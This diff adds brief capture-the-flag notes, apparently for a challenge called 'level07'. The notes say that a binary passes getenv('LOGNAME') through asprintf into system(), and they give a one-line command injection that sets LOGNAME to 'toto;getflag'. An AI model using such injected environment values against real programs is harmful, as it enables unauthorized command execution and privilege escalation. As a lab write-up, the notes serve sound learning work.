@@ -1,0 +1,7 @@
+* binaire with gdb you can see system call
+* sytem call arg is ret of asprintf
+* arg of asprintf is "/bin/echo %s ", getenv("LOGNAME")
+
+* exploit:
+
+- env LOGNAME='toto;getflag' ./level07
